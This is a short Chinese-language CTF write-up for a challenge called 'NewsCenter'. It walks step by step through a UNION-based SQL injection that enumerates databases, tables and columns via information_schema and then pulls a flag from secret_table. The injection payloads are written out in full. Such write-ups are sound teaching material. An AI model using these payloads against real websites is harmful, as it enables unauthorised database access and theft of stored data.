# NewsCenter

页面只有一个输入框, 只要输入 ,就是插xss 或者sql注入

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

输入 `hello'`   服务器出错了

<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

首先应该尝试联合查询, 当输入的消息能反馈到页面上,何乐不为呢? 手动盲注有点太费人了

当查询到第4列时,出现了错误,   说明原始查询返回了3列

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

尝试`database()`获取当前使用的数据库名称

<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

查询当前有多少数据库,`UNION+SELECT+null,null,GROUP_CONCAT(SCHEMA_NAME)+AS+name+FROM+information_schema.SCHEMATA` 把一列以逗号分隔显示

<figure><img src=".gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

`UNION+SELECT+null,null,TABLE_NAME+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA`  列出 news 库中所有的表名

<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

我对secret\_table表 感兴趣,看看他的列名

`COLUMN_NAME+FROM+information_schema.COLUMNS+WHERE+TABLE_NAME%3d'secret_table'`

<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

快完成了,我们   `UNION+SELECT+null,null,fl4g+from+secret_table`

<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>



## 总结:

可以使用 一次查询数据库名 和表名,只要返回的列足够,并且能被显示出来

`SELECT DISTINCT TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA!="information_schema";`

这个一个IN-BAND  的Union Based注入&#x20;
